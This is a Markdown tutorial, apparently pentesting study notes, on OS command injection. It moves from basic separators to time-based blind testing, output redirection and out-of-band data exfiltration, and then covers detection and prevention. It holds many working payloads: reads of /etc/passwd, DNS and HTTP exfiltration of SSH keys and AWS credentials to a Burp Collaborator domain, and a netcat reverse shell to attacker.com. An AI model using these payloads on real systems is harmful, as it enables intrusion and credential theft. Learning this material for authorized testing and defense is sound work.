# 💉 OS Command Injection - Complete Attack Guide

> 🎯 Master OS command injection vulnerabilities from basic to advanced exploitation techniques

---

## 📋 Table of Contents

- 🔍 Introduction
- 🔣 Injection Characters
- 📝 Simple Command Injection
- ⏱️ Blind Time-Based Injection
- 📁 Output Redirection
- 🌐 Out-of-Band Interaction
- 📤 Data Exfiltration
- 💻 Useful Commands
- 🔍 Detection Methods
- 🛡️ Prevention & Mitigation

---

## 🔍 Introduction

> [!danger] Critical Vulnerability OS Command Injection allows attackers to execute arbitrary system commands on the server, potentially leading to complete system compromise

### What is OS Command Injection?

**Definition:** OS Command Injection occurs when an application passes unsafe user-supplied data to a system shell, allowing execution of arbitrary commands.

**Impact:**

- 💀 Complete server compromise
- 📁 Data theft and exfiltration
- 🗑️ Data destruction
- 🔓 Privilege escalation
- 🌐 Network pivoting
- 🦠 Malware installation

---

## 🔣 Injection Characters

> [!info] Command Separators Characters used to chain or separate commands in shell

### 🎯 Command Separator Table

|Character|Name|Description|OS Support|
|---|---|---|---|
|`&`|Ampersand|Execute command in background|Unix/Windows|
|`&&`|Double Ampersand|AND operator (execute if previous succeeds)|Unix/Windows|
|`\|`|Pipe|Pass output to next command|Unix/Windows|
|`\|`|Double Pipe|OR operator (execute if previous fails)|Unix/Windows|
|`;`|Semicolon|Command separator|Unix|
|`\n`|Newline|Command separator|Unix|
|`` ` ``|Backtick|Command substitution|Unix|
|`$()`|Dollar Parentheses|Command substitution|Unix|
|`0x0a`|Hex Newline|Alternative newline|Unix|
|`%0a`|URL-encoded Newline|URL-encoded separator|Unix/Windows|

---

### 📝 Detailed Character Explanations

#### `&` - Background Execution

**Purpose:** Runs command in background

```bash
# Original command
ping -c 1 target.com

# Injected
ping -c 1 target.com & whoami
```

**Result:**

```
PING target.com...
user_account
```

---

#### `&&` - AND Operator

**Purpose:** Execute second command only if first succeeds

```bash
# Original command
ping -c 1 target.com

# Injected
ping -c 1 target.com && whoami
```

**Logic:**

- First command succeeds → Second executes ✅
- First command fails → Second doesn't execute ❌

---

#### `|` - Pipe Operator

**Purpose:** Pass output of first command to second

```bash
# Injected
cat /etc/passwd | grep root
```

**Result:** Filters passwd file for root entries

---

#### `||` - OR Operator

**Purpose:** Execute second command only if first fails

```bash
# Original command
ping -c 1 invalid.com

# Injected
ping -c 1 invalid.com || whoami
```

**Logic:**

- First command fails → Second executes ✅
- First command succeeds → Second doesn't execute ❌

---

#### `;` - Semicolon Separator

**Purpose:** Sequential command execution (Unix only)

```bash
# Original command
ping -c 1 target.com

# Injected
ping -c 1 target.com; whoami
```

**Result:** Both commands execute regardless of success/failure

---

#### `` ` `` - Backtick Substitution

**Purpose:** Execute command and substitute with output

```bash
# Injected
echo `whoami`
```

**Result:** Outputs the current username

---

#### `$()` - Command Substitution

**Purpose:** Modern syntax for command substitution

```bash
# Injected
echo $(whoami)
```

**Result:** Same as backtick, but more readable

---

## 📝 1. Simple OS Command Injection

> [!success] Direct Command Execution Most straightforward form of command injection

### 🎯 Attack Methodology

#### Step 1: Find Vulnerable Parameter

**Common Injection Points:**

- 🔍 Search boxes
- 📝 Form inputs
- 🔗 URL parameters
- 🍪 Cookie values
- 📨 HTTP headers

**Example URLs:**

```
http://example.com/ping?ip=127.0.0.1
http://example.com/whois?domain=example.com
http://example.com/traceroute?target=8.8.8.8
```

---

#### Step 2: Test for Injection

**Basic Test Payloads:**

```bash
# Simple separator test
127.0.0.1 & whoami

# With output verification
127.0.0.1 | whoami

# Unix-specific
127.0.0.1 ; whoami

# Command substitution
127.0.0.1 `whoami`

# Modern substitution
127.0.0.1 $(whoami)
```

---

#### Step 3: Inject Payload

**Example Attack:**

**Original Request:**

```
GET /ping?ip=127.0.0.1 HTTP/1.1
Host: vulnerable.com
```

**Injected Request:**

```
GET /ping?ip=127.0.0.1|whoami HTTP/1.1
Host: vulnerable.com
```

**Response:**

```
Pinging 127.0.0.1...
root
```

> [!success] Successful Injection The `whoami` command executed and returned output!

---

### 💡 Practical Examples

#### Example 1: Directory Listing

```bash
# Payload
127.0.0.1 && ls -la

# Output
total 48
drwxr-xr-x 2 www-data www-data 4096 Oct 30 10:00 .
drwxr-xr-x 3 root     root     4096 Oct 29 15:30 ..
-rw-r--r-- 1 www-data www-data  220 Oct 29 15:30 .bash_logout
```

---

#### Example 2: Read Sensitive Files

```bash
# Payload
127.0.0.1 ; cat /etc/passwd

# Output (partial)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

---

#### Example 3: Network Information

```bash
# Payload
127.0.0.1 && ifconfig

# Or for modern systems
127.0.0.1 && ip addr
```

---

## ⏱️ 2. Blind Command Injection with Time Delays

> [!warning] No Visible Output Application doesn't display command output, but execution can be inferred through timing

### 🎯 Detection Method

**Concept:**

```
Normal Response Time: 2 seconds
With sleep 10: 12 seconds (2 + 10)
Confirms injection: ✅
```

---

### 💣 Time-Based Payloads

#### Unix/Linux Systems

**Using `sleep`:**

```bash
# Basic payload
& sleep 10 #

# With different separators
| sleep 10 #
; sleep 10 #
&& sleep 10 #
```

**Example Attack:**

```
# Original request
POST /api/ping HTTP/1.1
ip=127.0.0.1

# Injected request
POST /api/ping HTTP/1.1
ip=127.0.0.1 & sleep 10 #
```

**Observation:**

- Normal response: ~2 seconds
- With payload: ~12 seconds
- **Conclusion:** Vulnerable! ✅

---

#### Cross-Platform (Unix & Windows)

**Using `ping`:**

```bash
# Unix/Linux (10 pings = ~10 seconds)
|| ping -c 10 127.0.0.1 ||

# Windows (10 pings = ~10 seconds)  
|| ping -n 10 127.0.0.1 ||
```

**Why This Works:**

- `-c` (count) on Unix/Linux
- `-n` (number) on Windows
- Each ping takes ~1 second
- 10 pings = 10 second delay

---

### 🔍 Progressive Testing

**Step-by-step Confirmation:**

**Test 1: Baseline**

```bash
# Payload: normal request
ip=127.0.0.1

# Time: 2 seconds
```

**Test 2: Short Delay**

```bash
# Payload
ip=127.0.0.1 || ping -c 3 127.0.0.1 ||

# Time: ~5 seconds (2 + 3)
# Status: Probably vulnerable 🤔
```

**Test 3: Long Delay**

```bash
# Payload
ip=127.0.0.1 || ping -c 10 127.0.0.1 ||

# Time: ~12 seconds (2 + 10)
# Status: Confirmed vulnerable! ✅
```

**Test 4: Very Long Delay**

```bash
# Payload
ip=127.0.0.1 && sleep 30 #

# Time: ~32 seconds (2 + 30)
# Status: Definitely vulnerable! ✅✅
```

---

### 💡 Automation with Burp Suite

**Burp Intruder Configuration:**

**Payload Position:**

```
ip=127.0.0.1§& sleep §§ #
```

**Payload List:**

```
1
5
10
20
30
```

**Sort by Response Time:**

- 1 second delay → ~3 seconds total
- 5 second delay → ~7 seconds total
- 10 second delay → ~12 seconds total

> [!tip] Clear Pattern Consistent time delays confirm vulnerability

---

## 📁 3. Blind Injection with Output Redirection

> [!info] Store and Retrieve Since we can't see output directly, redirect it to an accessible file

### 🎯 Attack Methodology

#### Step 1: Understand File Structure

**Common Web Directories:**

```
/var/www/html/              (Linux - Apache)
/usr/share/nginx/html/      (Linux - Nginx)
C:\inetpub\wwwroot\         (Windows - IIS)
/var/www/images/            (Writable upload directory)
/tmp/                       (Temporary directory)
```

---

#### Step 2: Inject with Redirection

**Syntax:**

```bash
command > /path/to/file
```

**Payloads:**

**Basic whoami:**

```bash
|| whoami > /var/www/html/output.txt ||
```

**Read /etc/passwd:**

```bash
|| cat /etc/passwd > /var/www/html/passwd.txt ||
```

**Directory listing:**

```bash
|| ls -la / > /var/www/html/listing.txt ||
```

**System information:**

```bash
|| uname -a > /var/www/html/sysinfo.txt ||
```

---

#### Step 3: Retrieve Output

**Access the File:**

```
http://vulnerable.com/output.txt
http://vulnerable.com/passwd.txt
http://vulnerable.com/listing.txt
```

---

### 💡 Practical Example

**Scenario:** Image upload functionality

**Step 1: Find writable directory**

```
Upload location: /var/www/images/
```

**Step 2: Inject command**

```bash
# Original request
POST /upload HTTP/1.1
filename=image.jpg

# Injected request
POST /upload HTTP/1.1
filename=image.jpg || whoami > /var/www/images/whoami.txt ||
```

**Step 3: Access output**

```
GET /images/whoami.txt HTTP/1.1

Response:
www-data
```

---

### 🔧 Advanced Redirection Techniques

#### Append Instead of Overwrite

```bash
# Append to existing file
|| whoami >> /var/www/html/log.txt ||

# Multiple commands, one file
|| echo "=== System Info ===" >> /var/www/html/info.txt ||
|| uname -a >> /var/www/html/info.txt ||
|| echo "=== User Info ===" >> /var/www/html/info.txt ||
|| whoami >> /var/www/html/info.txt ||
```

---

#### Error Redirection

```bash
# Redirect errors too
|| ls -la / > /var/www/html/out.txt 2>&1 ||
```

**Explanation:**

- `>` redirects stdout
- `2>&1` redirects stderr to stdout
- Both output and errors saved

---

## 🌐 4. Out-of-Band (OOB) Interaction

> [!success] External Server Communication Use DNS lookups or HTTP requests to external server you control

### 🎯 Using Burp Collaborator

#### What is Burp Collaborator?

**Purpose:**

- 🌐 External server that logs interactions
- 📊 Captures DNS queries
- 📡 Records HTTP requests
- 🕵️ Detects blind vulnerabilities

---

#### Step 1: Get Collaborator Domain

**In Burp Suite:**

```
Burp > Burp Collaborator Client > Copy to Clipboard
```

**Example Domain:**

```
abc123xyz.burpcollaborator.net
```

---

#### Step 2: Inject DNS Lookup Payload

**nslookup Method:**

```bash
# Basic test
|| nslookup burp-collaborator-subdomain ||

# With your actual domain
|| nslookup abc123xyz.burpcollaborator.net ||
```

**dig Method:**

```bash
|| dig abc123xyz.burpcollaborator.net ||
```

**host Method:**

```bash
|| host abc123xyz.burpcollaborator.net ||
```

---

#### Step 3: Check Collaborator

**In Burp Suite:**

```
Burp Collaborator Client > Poll Now
```

**If Vulnerable:**

```
DNS Query Received:
Type: A
Query: abc123xyz.burpcollaborator.net
Source IP: 203.0.113.10
```

> [!success] Confirmation DNS query received = Command executed!

---

### 💡 Why OOB Works

**Scenario:**

```
Application → Executes command → DNS lookup → Your server

You don't see output, but:
- DNS query logged ✅
- Confirms command execution ✅
- Can exfiltrate data (next section) ✅
```

---

### 🔧 Alternative OOB Methods

#### HTTP Callback

```bash
# Using curl
|| curl http://abc123xyz.burpcollaborator.net ||

# Using wget
|| wget http://abc123xyz.burpcollaborator.net ||
```

---

#### Ping (ICMP)

```bash
# May be blocked by firewall
|| ping -c 1 abc123xyz.burpcollaborator.net ||
```

---

## 📤 5. Out-of-Band Data Exfiltration

> [!danger] Data Theft Extract sensitive information via DNS queries or HTTP requests

### 🎯 DNS Exfiltration

#### Concept

**How It Works:**

```
1. Execute command: whoami
2. Result: www-data
3. DNS query: www-data.abc123xyz.burpcollaborator.net
4. Your server logs: www-data
```

---

#### Basic Payloads

**Using nslookup:**

```bash
# Extract whoami
|| nslookup `whoami`.abc123xyz.burpcollaborator.net ||

# Alternative syntax
|| nslookup $(whoami).abc123xyz.burpcollaborator.net ||
```

**Result in Collaborator:**

```
DNS Query: www-data.abc123xyz.burpcollaborator.net
Extracted Data: www-data
```

---

#### Advanced Exfiltration

**Extract Hostname:**

```bash
|| nslookup `hostname`.abc123xyz.burpcollaborator.net ||
```

**Extract Username:**

```bash
|| nslookup `whoami`.abc123xyz.burpcollaborator.net ||
```

**Extract Current Directory:**

```bash
|| nslookup `pwd | base64`.abc123xyz.burpcollaborator.net ||
```

> [!tip] Base64 Encoding Useful for handling special characters and spaces

---

**Extract File Contents:**

```bash
# First line of /etc/passwd
|| nslookup `head -1 /etc/passwd | base64`.abc123xyz.burpcollaborator.net ||

# Private key (first chunk)
|| nslookup `head -c 50 /home/user/.ssh/id_rsa | base64`.abc123xyz.burpcollaborator.net ||
```

---

### 🔧 HTTP Exfiltration

**Using curl:**

```bash
# Send data as GET parameter
|| curl "http://abc123xyz.burpcollaborator.net/?data=$(whoami)" ||

# Send data as POST
|| curl -X POST -d "data=$(cat /etc/passwd)" http://abc123xyz.burpcollaborator.net ||
```

**Using wget:**

```bash
# Send data in URL
|| wget "http://abc123xyz.burpcollaborator.net/?data=$(whoami)" ||
```

---

### 💡 Complete Exfiltration Example

**Scenario:** Extract AWS credentials

**Step 1: Check if file exists**

```bash
|| nslookup $(test -f ~/.aws/credentials && echo "exists" || echo "notfound").abc123xyz.burpcollaborator.net ||
```

**Step 2: Extract credentials (chunked)**

```bash
# First 63 characters (DNS limit)
|| nslookup `head -c 63 ~/.aws/credentials | base64`.abc123xyz.burpcollaborator.net ||

# Next chunk
|| nslookup `head -c 126 ~/.aws/credentials | tail -c 63 | base64`.abc123xyz.burpcollaborator.net ||
```

**Step 3: Decode on your server**

```bash
echo "BASE64_STRING" | base64 -d
```

---

## 💻 Useful Commands Reference

### 🔍 Information Gathering

|Command|Purpose|OS|
|---|---|---|
|`whoami`|Current user|Unix/Windows|
|`id`|User ID and groups|Unix|
|`hostname`|Machine name|Unix/Windows|
|`uname -a`|System information|Unix|
|`cat /etc/passwd`|User accounts|Unix|
|`cat /etc/shadow`|Password hashes|Unix (root)|
|`ls -la /`|Directory listing|Unix|
|`pwd`|Current directory|Unix/Windows|
|`ipconfig`|Network config|Windows|
|`ifconfig`|Network config|Unix|
|`ip addr`|Network config|Unix (modern)|
|`netstat -an`|Network connections|Unix/Windows|
|`ps aux`|Running processes|Unix|
|`cat /etc/hosts`|Hosts file|Unix|

---

### 📁 File Operations

|Command|Purpose|OS|
|---|---|---|
|`cat filename`|Read file|Unix|
|`head -n 10 file`|First 10 lines|Unix|
|`tail -n 10 file`|Last 10 lines|Unix|
|`find / -name "*.conf"`|Find files|Unix|
|`grep -r "password" /var/www`|Search in files|Unix|
|`ls -lah /home`|List home directories|Unix|
|`cat /proc/self/environ`|Environment variables|Unix|

---

### 🌐 Network Commands

|Command|Purpose|OS|
|---|---|---|
|`curl http://attacker.com`|HTTP request|Unix|
|`wget http://attacker.com`|Download file|Unix|
|`nc -e /bin/sh attacker.com 4444`|Reverse shell|Unix|
|`nslookup domain.com`|DNS lookup|Unix/Windows|
|`dig domain.com`|DNS query|Unix|
|`ping -c 4 8.8.8.8`|Network test|Unix|

---

## 🔍 Detection Methods

### 🛡️ For Defenders

**Application Monitoring:**

```
- Unexpected system calls
- Unusual command patterns
- External DNS queries
- Suspicious file access
- Network connections to unknown IPs
```

**Log Analysis:**

```bash
# Check web server logs for suspicious patterns
grep -E "&|&&|\||\|\||;|`|\$\(" /var/log/apache2/access.log

# Check system logs
grep "sh -c" /var/log/syslog
```

---

### 🔎 For Penetration Testers

**Testing Checklist:**

- [ ] Test all user inputs
- [ ] Try different separators
- [ ] Test with time delays
- [ ] Attempt output redirection
- [ ] Try OOB techniques
- [ ] URL encode payloads
- [ ] Double encode if needed
- [ ] Test with different shells (sh, bash, cmd)

---

## 🛡️ Prevention & Mitigation

### ✅ Secure Coding Practices

#### 1️⃣ Avoid System Calls

**❌ Vulnerable Code (PHP):**

```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

**✅ Secure Alternative:**

```php
// Use built-in functions instead
$ip = $_GET['ip'];
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    // Use PHP's native functions or safe library
    exec("ping -c 4 " . escapeshellarg($ip));
}
```

---

#### 2️⃣ Input Validation

**Whitelist Approach:**

```php
$ip = $_GET['ip'];

// Only allow valid IP addresses
if (preg_match('/^(\d{1,3}\.){3}\d{1,3}$/', $ip)) {
    // Safe to use
    exec("ping -c 4 " . escapeshellarg($ip));
} else {
    die("Invalid IP address");
}
```

---

#### 3️⃣ Use Safe APIs

```python
# ❌ Dangerous
os.system(f"ping -c 4 {user_input}")

# ✅ Safe
import subprocess
subprocess.run(['ping', '-c', '4', user_input], check=True)
```

---

#### 4️⃣ Escape User Input

```php
// PHP
$safe_input = escapeshellarg($user_input);
$safe_command = escapeshellcmd($command);

// Python
import shlex
safe_input = shlex.quote(user_input)
```

---

### 🔒 Defense in Depth

**Application Level:**

- Input validation
- Whitelist allowed values
- Use safe APIs
- Avoid system calls

**System Level:**

- Principle of least privilege
- Run application with minimal permissions
- Use AppArmor/SELinux
- Disable unnecessary commands

**Network Level:**

- Egress filtering
- Block DNS to untrusted servers
- Monitor outbound connections
- Implement WAF rules

---

## 🎓 Practice Labs

### 🧪 Legal Practice Platforms

**PortSwigger Web Security Academy:**

- Free OS Command Injection labs
- Progressive difficulty
- Hints available

**HackTheBox:**

- Machines with command injection
- Real-world scenarios

**TryHackMe:**

- Guided rooms
- OS Command Injection modules

---

## 📚 Summary & Key Takeaways

> [!success] Remember
> 
> 1. **Test all inputs** - Any user-controlled data is potential injection point
> 2. **Use multiple techniques** - Simple, time-based, OOB
> 3. **URL encode** - Special characters may need encoding
> 4. **Document everything** - Screenshot evidence for reports
> 5. **Get authorization** - Only test systems you're permitted to

---

## ⚠️ Legal Disclaimer

> [!danger] Authorized Testing Only
> 
> - ✅ Only test applications you own or have explicit written permission to test
> - ✅ Bug bounty programs with clear scope
> - ❌ Unauthorized testing is illegal
> - ❌ Can result in criminal prosecution

---

**Tags:** #command-injection #web-security #owasp #injection #pentesting #vulnerability